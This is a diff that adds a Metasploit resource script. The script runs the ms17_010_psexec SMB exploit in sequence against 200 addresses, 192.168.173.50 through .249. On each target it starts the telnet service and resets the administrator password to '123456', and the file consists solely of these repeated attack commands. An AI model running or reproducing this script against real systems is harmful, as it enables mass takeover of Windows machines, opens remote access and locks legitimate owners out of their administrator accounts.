@@ -1,0 +1,800 @@
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.50
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.51
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.52
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.53
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.54
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.55
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.56
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.57
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.58
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.59
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.60
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.61
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.62
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.63
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.64
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.65
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.66
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.67
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.68
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.69
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.70
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.71
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.72
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.73
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.74
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.75
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.76
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.77
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.78
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.79
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.80
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.81
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.82
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.83
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.84
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.85
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.86
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.87
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.88
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.89
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.90
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.91
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.92
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.93
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.94
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.95
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.96
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.97
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.98
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.99
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.100
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.101
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.102
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.103
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.104
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.105
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.106
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.107
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.108
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.109
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.110
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.111
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.112
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.113
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.114
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.115
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.116
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.117
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.118
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.119
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.120
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.121
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.122
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.123
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.124
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.125
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.126
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.127
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.128
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.129
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.130
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.131
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.132
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.133
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.134
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.135
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.136
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.137
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.138
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.139
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.140
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.141
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.142
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.143
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.144
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.145
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.146
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.147
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.148
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.149
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.150
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.151
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.152
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.153
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.154
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.155
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.156
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.157
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.158
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.159
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.160
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.161
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.162
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.163
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.164
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.165
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.166
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.167
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.168
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.169
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.170
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.171
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.172
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.173
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.174
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.175
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.176
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.177
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.178
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.179
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.180
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.181
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.182
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.183
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.184
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.185
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.186
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.187
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.188
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.189
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.190
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.191
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.192
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.193
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.194
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.195
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.196
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.197
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.198
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.199
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.200
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.201
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.202
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.203
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.204
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.205
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.206
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.207
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.208
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.209
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.210
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.211
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.212
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.213
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.214
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.215
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.216
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.217
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.218
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.219
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.220
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.221
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.222
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.223
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.224
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.225
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.226
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.227
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.228
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.229
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.230
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.231
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.232
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.233
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.234
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.235
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.236
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.237
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.238
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.239
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.240
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.241
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.242
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.243
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.244
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.245
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.246
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.247
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.248
+set cmd net start telnet&&net user administrator 123456
+run -j -z
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.173.249
+set cmd net start telnet&&net user administrator 123456
+run -j -z
